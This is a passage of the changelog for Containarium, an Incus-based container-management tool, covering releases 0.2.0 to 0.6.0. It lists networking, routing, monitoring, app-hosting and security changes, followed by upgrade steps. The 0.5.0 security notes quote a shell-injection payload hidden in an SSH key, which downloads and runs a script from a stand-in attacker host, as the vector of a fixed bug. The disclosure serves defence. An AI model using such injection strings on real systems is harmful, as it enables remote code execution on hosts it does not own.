- **Route domain doubling in Caddy**: Routes with independent FQDNs (e.g., `api.example.com`) were incorrectly getting the base domain appended (`api.example.com.<cluster>.example.com`), causing TLS and routing failures. Fixed `ProxyManager.addRouteWithProtocol()` to only append base domain for simple subdomains (no dots), leaving FQDNs as-is.
- **Routes API returning empty when app-hosting disabled**: The `/v1/network/routes` endpoint returned no routes because the standalone route store (created when `--app-hosting` is off) was never assigned to `NetworkServer`. Routes existed in PostgreSQL and synced to Caddy correctly, but the API couldn't serve them.
- **Route sync loop churning every 5 seconds**: The domain doubling bug caused a perpetual add/remove cycle (`+4 added, -4 removed` every tick) because Caddy's doubled domains never matched PostgreSQL's correct domains.
- **Useradd lock file on read-only filesystem**: `flock /var/lock/containarium-useradd.lock` failed with `ProtectSystem=strict` because `/var/lock` was not in `ReadWritePaths`. Now included in the canonical service template.
- Force remove agent when creating user container
- Persist Caddy route records into PostgreSQL as single source of truth
- Startup deadlock

## [0.6.0] - 2026-02-15

### Added

#### Software Stack Selection
- New `--stack` flag for `containarium create` command to install pre-configured software stacks
- Available stacks: `nodejs`, `python`, `golang`, `rust`, `datascience`, `devops`, `database`, `fullstack`
- Stack definitions in `configs/stacks.yaml` with APT packages and post-install commands
- New `internal/stacks` package for loading and managing stack configurations
- Web UI: Stack selection dropdown in Create Container dialog with descriptions
- Proto: Added `stack` field to `CreateContainerRequest` and `Container` messages
- Each stack installs relevant packages and tools during container creation:
  - **nodejs**: Node.js LTS, npm, yarn, pnpm, TypeScript
  - **python**: Python 3, pip, virtualenv, poetry
  - **golang**: Go, gopls, golangci-lint
  - **rust**: Rust toolchain via rustup
  - **datascience**: Python with Jupyter, pandas, numpy, scikit-learn
  - **devops**: kubectl, Terraform
  - **database**: PostgreSQL, MySQL, Redis CLI clients
  - **fullstack**: Node.js + Python + database clients

#### Port Forwarding CLI Commands
- New `containarium portforward` command group for managing iptables port forwarding rules
- `containarium portforward show` - Display current PREROUTING/POSTROUTING rules and IP forwarding status
- `containarium portforward setup --caddy-ip <IP>` - Setup port forwarding rules for Caddy
- `containarium portforward setup --auto` - Auto-detect Caddy container IP from Incus
- `containarium portforward remove --caddy-ip <IP>` - Remove port forwarding rules
- Automatic port forwarding setup when daemon starts with `--app-hosting` enabled

#### Event-Driven Architecture (SSE)
- New Server-Sent Events (SSE) endpoint at `/v1/events/subscribe` for real-time updates
- Event types for containers: created, deleted, started, stopped, state changed
- Event types for apps: deployed, deleted, started, stopped, state changed
- Event types for routes: added, deleted
- Central event bus (`internal/events/bus.go`) with pub/sub pattern
- Type-safe event emission via `Emitter` interface
- Frontend `useEventStream` hook with automatic reconnection and heartbeat handling
- 15-second SSE heartbeat to prevent proxy timeouts
- Removes need for polling in Web UI - instant updates on state changes

#### Dashboard CPU Load Metrics
- Added real-time CPU load display to the System Resources dashboard
- Shows 1-minute load average with progress bar visualization
- Displays load as "X.XX / N cores" format for easy interpretation
- Color-coded utilization: green (<60%), yellow (60-80%), red (>80%)
- Backend reads load averages from `/proc/loadavg`
- New proto fields: `cpu_load_1min`, `cpu_load_5min`, `cpu_load_15min` in SystemInfo

#### Disaster Recovery Command
- New `containarium recover` command for restoring containers after instance recreation
- Supports two modes:
  - **Explicit mode**: Specify parameters via CLI flags
    ```bash
    containarium recover \
      --network-cidr 10.0.3.1/24 \
      --zfs-source incus-pool/containers
    ```
  - **Config mode**: Load from persistent storage config file
    ```bash
    containarium recover --config /mnt/incus-data/containarium-recovery.yaml
    ```
- Recovery process handles:
  1. Network creation (incusbr0 with correct CIDR)
  2. Storage pool import via `incus admin recover`
  3. Default profile configuration (eth0 device)
  4. Starting all recovered containers
  5. Syncing SSH jump accounts via `sync-accounts`
- Recovery config is automatically saved to persistent storage during daemon startup
- Supports `--dry-run` flag to preview recovery actions

#### Per-Container Traffic Monitoring
- New Traffic tab in Web UI for connection-level network monitoring
- Real-time connection tracking using Linux conntrack via netlink
- View active TCP/UDP connections per container with:
  - Source/destination IP and port
  - Protocol and connection state (ESTABLISHED, TIME_WAIT, etc.)
  - Bytes sent/received with live counters
  - Connection direction (INGRESS/EGRESS)
  - Duration and timeout information
- Connection summary showing aggregate stats:
  - Active connection counts (total, TCP, UDP)
  - Total bytes sent/received
  - Top destinations by connection count and bandwidth
- Real-time updates via Server-Sent Events (SSE)
- Historical connection persistence in PostgreSQL
- REST API endpoints:
  - `GET /v1/containers/{name}/connections` - List active connections
  - `GET /v1/containers/{name}/connections/summary` - Get connection summary
  - `GET /v1/containers/{name}/traffic/history` - Query historical connections
  - `GET /v1/containers/{name}/traffic/aggregates` - Get time-series aggregates
- gRPC streaming: `SubscribeTraffic` for real-time connection events
- Container IP to name resolution via cache with periodic refresh
- New proto definitions in `traffic.proto` (Connection, TrafficEvent, etc.)
- New `internal/traffic/` package:
  - `conntrack_linux.go` - Linux netlink conntrack implementation
  - `collector.go` - Event coordination and caching
  - `store.go` - PostgreSQL persistence
  - `server.go` - TrafficService gRPC implementation
  - `cache.go` - Container IP mapping

#### Network Route Management
- Added route management UI to Network tab in Web UI
- Add/Delete proxy routes through the web interface
- Domain dropdown shows existing TLS-enabled routes from Caddy
- Target IP dropdown shows running containers with name and IP
- Routes managed via Caddy Admin API for dynamic configuration
- New API endpoint: `GET /v1/network/dns-records` for domain suggestions

#### gRPC Proxy Support
- Added protocol selection (HTTP/gRPC) when creating proxy routes
- gRPC routes use HTTP/2 (h2c) transport for backend communication
- Caddy reverse proxy automatically configured with correct protocol handling
- New `RouteProtocol` enum in proto: `ROUTE_PROTOCOL_HTTP`, `ROUTE_PROTOCOL_GRPC`
- Protocol field added to `ProxyRoute`, `AddRouteRequest`, `UpdateRouteRequest`
- Web UI shows protocol column in routes table (HTTP/gRPC chip)
- Protocol selector dropdown in Add Route dialog
- Backend support via `NewGRPCTransport()` and `AddGRPCRoute()` in proxy manager

#### TCP/UDP Passthrough Routes
- Added passthrough route support for direct TCP/UDP port forwarding via iptables
- Ideal for mTLS gRPC services where TLS should not be terminated at proxy
- Unified routes view in Web UI showing both proxy and passthrough routes
- Route type selector in Add Route dialog: Proxy (TLS terminated) vs Passthrough (direct)
- New proto definitions: `RouteType` enum, `PassthroughRoute` message
- New `RouteProtocol` values: `ROUTE_PROTOCOL_TCP`, `ROUTE_PROTOCOL_UDP`
- REST API endpoints:
  - `GET /v1/network/passthrough` - List passthrough routes
  - `POST /v1/network/passthrough` - Add passthrough route
  - `DELETE /v1/network/passthrough/{external_port}` - Delete passthrough route
- Backend `PassthroughManager` in `internal/network/portforward.go` for iptables management
- Web UI visual distinction: Proxy routes (🌐) vs Passthrough routes (🔌)

#### Automatic TLS Certificate Provisioning
- New `ProvisionTLS()` method in ProxyManager for automatic SSL certificate provisioning
- When adding a route, Caddy automatically obtains a TLS certificate for the domain
- Adds domain to Caddy's TLS automation policy with ACME (Let's Encrypt) and ZeroSSL issuers
- Graceful fallback: if TLS provisioning fails, route is still added (may use wildcard cert)
- See [docs/TLS-PROVISIONING.md](docs/TLS-PROVISIONING.md) for detailed documentation

#### Disaster Recovery Command
- See [docs/DISASTER-RECOVERY.md](docs/DISASTER-RECOVERY.md) for detailed documentation

### Changed

#### Docker to Podman Migration
- **BREAKING**: Replaced Docker with Podman as the container runtime inside LXC containers
- Renamed proto fields: `enable_docker` → `enable_podman`, `docker_enabled` → `podman_enabled`
- Updated CLI flag: `--docker` → `--podman` (default: true)
- Updated Web UI: "Enable Docker" checkbox → "Enable Podman" checkbox
- **Podman 5.x from Kubic repository**: Uses OpenSUSE Kubic unstable repository for latest Podman versions (5.x) instead of Ubuntu's default (4.9.x)
- **podman-compose via pip**: Installs podman-compose from PyPI for latest version instead of apt package
- Podman provides Docker-compatible CLI (`podman` commands work like `docker`)
- Note: Dockerfile naming kept as standard (works with both Docker and Podman)

- Dashboard "CPU Cores" section renamed to "CPU Load" with usage visualization
- Route management moved from Apps tab to Network tab exclusively
- `RemoveRoute` now properly extracts subdomain from full domain for deletion
- Added fallback deletion by route index when routes lack `@id` field
- **Auto-detect Caddy container IP**: When `--app-hosting` is enabled and `--caddy-admin-url` is not specified, the daemon automatically finds a running container with "caddy" in its name and uses its IP for the Caddy Admin API (e.g., `http://10.0.3.111:2019`)
- **Type-safe Caddy API**: Refactored `proxy.go` to use strongly-typed structs instead of `map[string]interface{}` for Caddy API interactions. New types include `CaddyRouteTyped`, `CaddyReverseProxyHandler`, `CaddyTLSAutomationPolicy`, `CaddyTLSIssuer`, and helper functions like `NewTLSPolicy()` and `NewReverseProxyRoute()`

### Fixed
- Fixed route deletion when full domain is passed instead of subdomain
- Fixed routes created via Caddyfile not being deletable (missing @id)
- Fixed WebUI static files not being embedded correctly after build
- **Fixed port forwarding blocking container outbound HTTPS**: iptables PREROUTING rules now exclude the entire container network CIDR (`! -s 10.x.x.0/24`) instead of just Caddy's IP. This allows all containers to access external HTTPS services (Docker Hub, Let's Encrypt, etc.)
- Fixed route display showing `ip:port:0` format by properly parsing Caddy's `Dial` field into separate IP and port fields

## [0.5.0] - 2026-02-10

### Security
- **CRITICAL: Fixed shell injection via SSH key content** (`internal/container/manager.go`)
  - Malicious SSH keys could execute arbitrary commands inside containers
  - Attack vector: `ssh-ed25519 AAAA' && curl evil.com/shell.sh | bash && echo '`
  - Fix: Replaced shell `echo` command with Incus `WriteFile()` API
- **CRITICAL: Fixed shell injection in sudoers setup** (`internal/container/manager.go`)
  - Similar pattern to SSH key injection, mitigated by username validation
  - Fix: Replaced shell `echo` command with Incus `WriteFile()` API
- **CRITICAL: Fixed WebSocket terminal missing authentication** (`internal/gateway/gateway.go`)
  - Unauthenticated users could open shell sessions by not providing a token
  - Fix: Made token validation mandatory (returns 401 if no token provided)
- **CRITICAL: Fixed CORS allowing all origins** (`internal/gateway/gateway.go`)
  - CORS was configured with `*` allowing any website to make API requests
  - Fix: Restricted to localhost by default, configurable via `CONTAINARIUM_ALLOWED_ORIGINS` env var
- **CRITICAL: Fixed WebSocket origin validation always returning true** (`internal/gateway/terminal.go`)
  - Combined with missing auth, any webpage could open terminal sessions
  - Fix: Validates origin against allowed list, rejects requests without Origin header
- **Fixed non-expiring JWT tokens allowed** (`internal/auth/token.go`)
  - `--expiry 0` created tokens that never expired
  - Fix: Enforced maximum 30-day expiry (configurable via `CONTAINARIUM_MAX_TOKEN_EXPIRY_HOURS`)
- **Fixed hardcoded developer username path** (`internal/container/manager.go`)
  - Removed `/home/hsinhoyeh` from SSH key fallback paths (information leak)
- **Fixed hardcoded private key path in Terraform** (`terraform/gce/main.tf`)
  - Replaced hardcoded path with `ssh_private_key_path` variable
- **Added checksum verification to install script** (`scripts/install-mcp.sh`)
  - Downloads and verifies SHA256 checksum before installation

### Added
- **Security Test Suite** - Comprehensive tests for security-critical code
  - `internal/auth/token_test.go` - JWT token expiry enforcement tests
  - `internal/gateway/security_test.go` - CORS and WebSocket origin validation tests
  - `internal/container/security_test.go` - Shell injection prevention tests
- **New Environment Variables**:
  - `CONTAINARIUM_ALLOWED_ORIGINS` - Comma-separated list of allowed CORS/WebSocket origins
  - `CONTAINARIUM_MAX_TOKEN_EXPIRY_HOURS` - Maximum JWT token expiry in hours (default: 720)
- **New Terraform Variable**:
  - `ssh_private_key_path` - Path to SSH private key for provisioner connections
- **Container Label Management** - Kubernetes-style labels for organizing containers
  - CLI commands for label operations:
    - `containarium label set <username> key=value [key2=value2...]` - Set labels on a container
    - `containarium label remove <username> <key> [key2...]` - Remove labels from a container
    - `containarium label list <username>` - List all labels on a container
  - List command enhancements:
    - `--show-labels` flag to display labels in container list
    - `--label key=value` flag to filter containers by label
    - `--group-by <label-key>` flag to group containers by label value
  - REST API endpoints:
    - `GET /v1/containers/{username}/labels` - Get container labels
    - `PUT /v1/containers/{username}/labels` - Set container labels
    - `DELETE /v1/containers/{username}/labels/{key}` - Remove a label
  - Labels stored in Incus config with `user.containarium.label.` prefix
- **Web UI Label Features**
  - Label editor dialog for adding/removing labels on containers
  - Label edit button (tag icon) in both Grid View and List View
  - Labels displayed as chips in List View
  - "Group by" dropdown to organize containers by label key
  - Grouped view shows containers in sections with label value headers

## [0.4.0] - 2026-01-25

### Added
- **Web UI Enhancements** - Improved container management dashboard
  - Grid/List view toggle for containers (switch between card grid and table views)
  - System Resources Card showing overall CPU cores, memory usage, and storage usage
  - Per-container disk quota display (current usage / total quota with progress bars)
  - Demo page with mock data at `/webui/demo` for UI preview
- **App Hosting Feature** - Deploy web applications with automatic HTTPS
  - `containarium app deploy` - Deploy apps from source directory
  - `containarium app list` - List deployed applications
  - `containarium app logs` - View application logs
  - `containarium app stop/start/restart` - Lifecycle management
  - `containarium app delete` - Remove applications
  - Auto-detection for 7 languages: Node.js, Python, Go, Rust, Ruby, PHP, Static
  - Buildpack system generates Dockerfiles automatically
  - PostgreSQL storage for app metadata
  - Subdomain-based routing (e.g., `username-appname.containarium.dev`)
- **Auto-Provisioned Core Services** - Infrastructure containers managed by Containarium
  - `containarium-core-postgres` - PostgreSQL container for app metadata storage (2 CPU, 2GB RAM, 10GB disk)
  - `containarium-core-caddy` - Caddy reverse proxy container for TLS termination (1 CPU, 512MB RAM, 5GB disk)
  - Automatically created on daemon startup with `--app-hosting` flag
  - Core containers use static IPs and are excluded from user container listings
  - Self-healing: containers are recreated if missing or stopped
- **Caddy Reverse Proxy Integration** - Automatic TLS with DNS-01 challenge
  - Wildcard certificate support for `*.containarium.dev`
  - Dynamic route configuration via Caddy Admin API
  - Setup script: `scripts/setup-caddy.sh`
  - Supports 8 DNS providers: Cloudflare, Route53, Google Cloud DNS, DigitalOcean, Azure, Vultr, DuckDNS, Namecheap
  - Documentation: `docs/CADDY-SETUP.md`
- **Docker-in-Docker Privileged Mode** - Full Docker support inside containers
  - `EnableDockerPrivileged` option for container creation
  - Automatically sets `security.privileged=true` and `raw.lxc=lxc.apparmor.profile=unconfined`
  - Required for Docker builds to work inside Incus containers
- **New daemon flags for App Hosting**:
  - `--app-hosting` - Enable app hosting feature
  - `--postgres` - PostgreSQL connection string
  - `--base-domain` - Base domain for app subdomains (default: `containarium.dev`)
  - `--caddy-admin-url` - Caddy admin API URL (default: `http://localhost:2019`)
- **ProxyManager unit tests** - 9 test cases for Caddy API integration
- **Auto-initialization of Incus infrastructure** on daemon startup
  - Automatically creates storage pool (`default` with `dir` driver)
  - Automatically creates network bridge (`incusbr0`)
  - Automatically configures default profile with network and storage devices
  - Safe default subnet: `10.100.0.1/24` (avoids conflicts with common networks like 10.0.0.0/8)
- **Network subnet configuration** via `--network-subnet` flag
  - Customize container network subnet (default: `10.100.0.1/24`)
  - Example: `containarium daemon --network-subnet 192.168.50.1/24`
- **Skip infrastructure initialization** via `--skip-infra-init` flag
  - Useful when infrastructure is already configured manually
  - Example: `containarium daemon --skip-infra-init`
- **New Incus client methods** for infrastructure management:
  - `EnsureNetwork()` - Create network if not exists
  - `EnsureStorage()` - Create storage pool if not exists
  - `EnsureDefaultProfile()` - Configure default profile
  - `InitializeInfrastructure()` - One-call setup for all infrastructure
  - `GetNetworkSubnet()` - Get configured subnet for a network
- **HTTP/REST client for CLI** - Alternative to gRPC for remote server communication
  - `--http` flag to use HTTP/REST API instead of gRPC
  - `--token` flag for JWT authentication token
  - Supports all CLI commands: `create`, `list`, `delete`, `info`
  - Example: `containarium list --server http://host:8080 --http --token <JWT>`
- **Web UI server management with localStorage persistence**
  - Server configurations (URL, name, token) stored in browser localStorage
  - Persists across browser sessions until explicitly removed
  - Add Server dialog with connection testing
  - Edit server via pencil icon on server tab
  - Remove server via X icon on server tab
  - Multi-server support with tab-based switching
- **SSH public key input in Web UI** - Option to provide your own SSH public key
  - Uncheck "Auto-generate SSH key pair" to reveal public key input field
  - Paste existing SSH public key instead of auto-generating

### Changed
- CLI now supports both gRPC and HTTP protocols equally (neither marked as deprecated)
- Server address flag help text updated to reflect dual-protocol support

### Fixed
- **Disk quota not showing in API response** - Fixed `toProtoContainer()` to include disk size in `ResourceLimits` struct, previously only CPU and memory were being returned
- **Network/Routes 500 errors** - Fixed nil pointer issues when Caddy proxy is not configured
- **Node.js buildpack `npm ci` failure** - Fixed Dockerfile generation to use `npm install --omit=dev` when `package-lock.json` is missing, falls back to `npm ci --omit=dev` when lock file exists
- **PostgreSQL timestamp encoding** - Fixed `deployedAt` field type from `*interface{}` to `*time.Time` for proper database encoding
- **Caddy server name mismatch** - Fixed ProxyManager to use `srv0` (Caddyfile default) instead of hardcoded `main`, now configurable via `SetServerName()`
- **Docker AppArmor permission denied** - Added privileged mode and AppArmor unconfined profile for Docker-in-Docker support
- **Network subnet conflicts** - Previously manual network setup could conflict with host network
  - Auto-initialization uses safe default `10.100.0.1/24` instead of common `10.0.3.0/24`
  - Prevents loss of connectivity when running Containarium inside LXC containers

## [0.3.0] - 2026-01-15

### Added
- **Web UI Dashboard** - Modern browser-based container management interface
  - Real-time container metrics (CPU, Memory, Disk usage with progress bars)
  - Multi-server management with tab-based interface
  - Container lifecycle management (create, start, stop, delete)
  - Browser-based terminal access via WebSocket
  - Client-side SSH key generation (keys never sent to server)
  - Embedded in Go binary for single-file deployment
  - Available at `/webui/` endpoint
- **Container Metrics API** - Real-time resource monitoring
  - CPU usage percentage calculation
  - Memory and disk usage with limits
  - Network I/O statistics
  - Process count per container
- **WebSocket Terminal** - Browser-based container shell access
  - Direct terminal access without SSH client
  - Runs as container user via Incus exec
  - JWT token authentication via query parameter
- **Makefile improvements**:
  - `make webui` - Build Next.js web UI for embedding
  - `make clean-ui` - Clean swagger-ui and webui files
  - `make clean-all` - Clean all artifacts including UI
- **REST API support via grpc-gateway** - HTTP/JSON API alongside existing gRPC
  - All 10 container management endpoints exposed via REST
  - Dual-protocol support: gRPC (port 50051) + REST (port 8080)
  - Backward compatible - existing gRPC clients unaffected
- **JWT token authentication** for REST API
  - Bearer token authentication with configurable expiry
  - Token generation command: `containarium token generate`
  - Support for token secret files (`--jwt-secret-file`)
  - Roles-based authorization support
- **Interactive Swagger UI** for API exploration
  - Available at `/swagger-ui/` endpoint
  - CDN fallback for zero-setup experience
  - Embedded files support for offline use
- **OpenAPI specification generation**
  - Automatic OpenAPI/Swagger spec generation from proto files
  - Available at `/swagger.json` endpoint
  - Comprehensive API documentation with examples
- **Enhanced daemon command** with new REST flags:
  - `--rest` - Enable/disable REST API (default: true)
  - `--http-port` - Configure REST API port (default: 8080)
  - `--jwt-secret` / `--jwt-secret-file` - Configure JWT authentication
  - `--swagger-dir` - Swagger files directory
- **Complete upgrade system** for the entire Containarium stack:
  - `containarium upgrade self` - Upgrade Containarium binary from GitHub releases
  - `containarium upgrade host` - Upgrade host dependencies (Incus, system packages, kernel modules)
  - `containarium upgrade containers` - Upgrade software inside containers (Docker, base OS, tools)
  - `containarium upgrade all` - Upgrade everything in the correct order
- **Changelog display** during upgrades - shows release notes before upgrading
- **Runtime version checking** with warnings for outdated components
- **Rolling upgrades** for containers (`--rolling` flag) to minimize downtime
- **Reboot detection** - automatically detects if system reboot is required after upgrade
- **Mock server** for local testing of upgrade commands (`test/mock-server.py`)
- **Test fixtures** for upgrade testing without needing real releases

### Fixed
- Docker build support by requiring Incus 6.19+ (fixes CVE-2025-52881 AppArmor bug)
- Terraform startup scripts now install Incus from Zabbly repository
- All Terraform startup scripts updated for Incus 6.19+
- Fixed typo in proto package name: `continariumv1` → `containariumv1`
- **JWT secret handling** - Fixed trailing newline issues when reading JWT secrets from files
- **Gateway mTLS connection** - Fixed HTTP gateway to properly connect to gRPC server with mTLS
- **Installation script (`hacks/install.sh`)** - Multiple critical fixes:
  - Fixed Incus package conflict by adding APT pinning to prioritize Zabbly repository over Ubuntu
  - Added `--batch --yes` flags to GPG commands for non-interactive SSH installation
  - Changed `incus-tools` to `incus-extra` (newer package name in Zabbly repository)
  - Fixed systemd service permissions (`ProtectSystem=false`, `ProtectHome=false`)
  - Added automatic TLS certificate generation step for mTLS
- **Google Guest Agent race condition** - Fixed `/etc/passwd` lock conflicts during user creation
  - Stop google-guest-agent → remove stale locks → create user → restart agent
  - Prevents "cannot lock /etc/passwd; try again later" errors
- **Container creation improvements**:
  - Fixed image format parsing to support both `ubuntu:24.04` and `images:ubuntu/24.04` formats
  - Fixed SSH directory creation (`.ssh` not created before writing `authorized_keys`)
  - Added `--force` flag to delete and recreate existing containers
- **StopContainer API** - Fixed to use proper API field (`Force: true`) instead of string action

### Changed
- Updated documentation with Incus 6.19+ system requirements
- Renamed `upgrade incus` to `upgrade host` for better clarity (includes more than just Incus)
- Upgrade commands now provide detailed progress and status information
- Proto generation now includes grpc-gateway and OpenAPI plugins

### Security
- JWT-based authentication for REST API with configurable token expiry
- Bearer token validation middleware
- CORS support with configurable origins
- Preserved mTLS authentication for gRPC (unchanged)

## [0.2.0] - 2025-01-12

### Added
- Container resize command (`containarium resize`) for dynamic resource adjustment
  - Resize CPU, memory, and disk without downtime
  - Advanced CPU options: range allocation and core pinning
- mTLS (mutual TLS) support for daemon API
  - Certificate generation command (`containarium cert generate`)
  - Client certificate authentication
  - Secure remote management
- Comprehensive documentation for resize functionality
- Remote gRPC daemon for container management
- Production deployment examples with Terraform

### Security
- Added mTLS authentication for daemon API
- SSH hardening in jump server configuration
- Fail2ban integration for brute-force protection

### Infrastructure
- Terraform modules for GCE deployment
- Support for spot instances with persistent storage
- ZFS-backed storage for disk quotas
- Hyperdisk support for C4 instance types

---

## Upgrade Instructions

### Upgrading from 0.1.x to 0.2.0

**Important:** This version requires Incus 6.19 or later for Docker build support.

1. Upgrade Incus on your host:
   ```bash
   # Add Zabbly repository
   curl -fsSL https://pkgs.zabbly.com/key.asc | sudo gpg --dearmor -o /usr/share/keyrings/zabbly-incus.gpg
   echo 'deb [signed-by=/usr/share/keyrings/zabbly-incus.gpg] https://pkgs.zabbly.com/incus/stable noble main' | sudo tee /etc/apt/sources.list.d/zabbly-incus-stable.list
   sudo apt update
   sudo apt install --only-upgrade incus incus-tools incus-client
   ```

2. Upgrade Containarium binary:
   ```bash
   curl -fsSL https://github.com/FootprintAI/Containarium/releases/download/0.2.0/containarium-linux-amd64 -o /tmp/containarium
   sudo install -m 755 /tmp/containarium /usr/local/bin/containarium
   sudo systemctl restart containarium  # if running as daemon
   ```

3. Verify versions:
   ```bash
   incus --version     # Should show 6.19 or later
   containarium version
   ```

---

## Version History

- **v0.10.0** (2026-03-09) - Monitoring stack (VictoriaMetrics + Grafana + OTel), disk cleanup, stop container, passthrough persistence
- **0.9.1** (2026-02-28) - Boot disk validation fix for production
- **0.9.0** (2026-02-28) - Terraform Module Consolidation, single source of truth for dev and production
- **0.8.2** (2026-02-28) - sshpiper SSH reverse proxy on sentinel
- **0.8.1** (2026-02-27) - Preemption recovery fix, PostgreSQL retry, sentinel iptables fix, role-based container labeling
- **0.8.0** (2026-02-27) - Sentinel TLS Cert Sync, Status Page, Management SSH, Sentinel Design Doc
- **0.7.0** (2026-02-25) - Collaborator Permissions, Docker CE Stack, Service Install, Daemon Config Persistence
- **0.6.0** (2026-02-15) - Per-Container Traffic Monitoring, Docker to Podman Migration
- **0.5.0** (2026-02-10) - Security Hardening Release (5 critical fixes)
- **0.4.0** (2026-01-25) - App Hosting, Auto-Provisioned Core Services, Network Topology
- **0.3.0** (2026-01-15) - Web UI Dashboard, Container Metrics, WebSocket Terminal
- **0.2.0** (2025-01-12) - Resize command, mTLS support, production readiness
- **0.1.0** (Initial release) - Basic container management, SSH jump server

[v0.10.0]: https://github.com/FootprintAI/Containarium/compare/0.9.1...v0.10.0
[0.9.1]: https://github.com/FootprintAI/Containarium/compare/0.9.0...0.9.1
[0.9.0]: https://github.com/FootprintAI/Containarium/compare/0.8.2...0.9.0
[0.8.2]: https://github.com/FootprintAI/Containarium/compare/0.8.1...0.8.2
[0.8.1]: https://github.com/FootprintAI/Containarium/compare/0.8.0...0.8.1
[0.8.0]: https://github.com/FootprintAI/Containarium/releases/tag/0.8.0
[0.7.0]: https://github.com/FootprintAI/Containarium/releases/tag/0.7.0
[0.6.0]: https://github.com/FootprintAI/Containarium/releases/tag/0.6.0
[0.5.0]: https://github.com/FootprintAI/Containarium/releases/tag/0.5.0
[0.4.0]: https://github.com/FootprintAI/Containarium/releases/tag/0.4.0
[0.3.0]: https://github.com/FootprintAI/Containarium/releases/tag/0.3.0
[0.2.0]: https://github.com/FootprintAI/Containarium/releases/tag/0.2.0
